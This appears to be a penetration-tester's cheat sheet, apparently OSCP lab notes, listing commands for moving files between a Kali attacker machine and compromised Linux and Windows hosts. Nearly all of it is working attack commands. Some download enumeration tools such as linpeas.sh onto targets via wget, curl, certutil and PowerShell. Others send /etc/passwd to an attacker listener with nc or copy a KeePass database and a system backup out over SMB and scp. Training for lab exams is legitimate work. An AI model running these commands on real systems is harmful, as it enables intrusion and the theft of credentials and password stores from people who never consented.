## Download File to Target

Hosting a file on kali

- python3 -m http.server $port#

Getting file on linux box

- wget http://192.168.45.224:8000/linpeas.sh
- curl -O http://192.168.45.161:80/linpeas.sh

Getting a file on window box

- certutil.exe -urlcache -f http://kali-ip:port/filename filename
- iwr -uri http://kali-ip:port/fileName -Outfile fileName
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "iwr -uri http://10.10.139.147:1235/testfile.txt -Outfile testfile.txt"

---

## Download File to Kali

#### Linux -> Linux:

Start SSH on Kali

- sudo systemctl start ssh
- sudo systemctl status ssh
- sudo systemctl stop ssh

Copy File from Window Box

- scp sitebackup1.zip kali@192.168.45.231:~/Desktop/OSCPA

#### Linux -> Linux:

Target Linux box

- nc -nv 192.168.45.207 80 < /etc/passwd

Kali Box

- nc -nvlp 80

#### Linux -> Linux:

Target Linux

- python3 -m http.server 8080

Kali

- wget http://target-ip/port/file_name

#### Window -> Kali 1

Set up share-drive on kali

- impacket-smbserver -smb2support test . -username kali -password kali

Window

- net use \\\kali-ip\test /user:kali kali
- copy Database.kdbx \\192.168.45.161\test

#### Window -> Kali 2

Kali

- sudo service ssh start

Window

- C:\Users\jason\Documents> scp system.bak kali@192.168.45.161:/home/kali/Desktop/oscp/module23/
